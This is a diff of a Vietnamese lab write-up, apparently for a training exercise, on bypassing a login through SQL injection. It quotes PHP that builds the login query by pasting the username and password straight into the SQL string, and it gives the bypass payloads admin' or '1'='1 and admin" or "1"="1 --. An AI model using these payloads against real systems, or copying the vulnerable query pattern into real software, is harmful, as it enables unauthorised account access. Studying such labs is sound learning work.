@@ -473,10 +473,35 @@ show tables;
 select * from news;
 select * from users;
 ```
-
 ![image](https://github.com/user-attachments/assets/efafadf4-53cc-4a06-a857-a3147240b04e)
 
+## Basic
+### LV1:
+- LV này thì mình ko đọc source mình sql đại:)))
+```bash
+admin' or '1'='1
+```
+
 ![image](https://github.com/user-attachments/assets/d77d3526-f848-488f-8f3e-1a3844410a1f)
+
+### LV2:
+- Do có đọc source nên mình được sytax của truy vấn.
+
+```php
+{
+	try {
+		include("db.php");
+		$database = make_connection("plaintext_db");
+
+		$sql = "SELECT username FROM users WHERE username=\"$username\" AND password=\"$password\"";
+		$query = $database->query($sql);
+		$row = $query->fetch_assoc(); // Get the first row
+```
+
+- Do đó mình truy vấn như sau:
+```bash 
+admin" or "1"="1 -- 
+```
 
 ![image](https://github.com/user-attachments/assets/defc8e9a-2f4c-4aa8-b333-30003824b5cf)
 
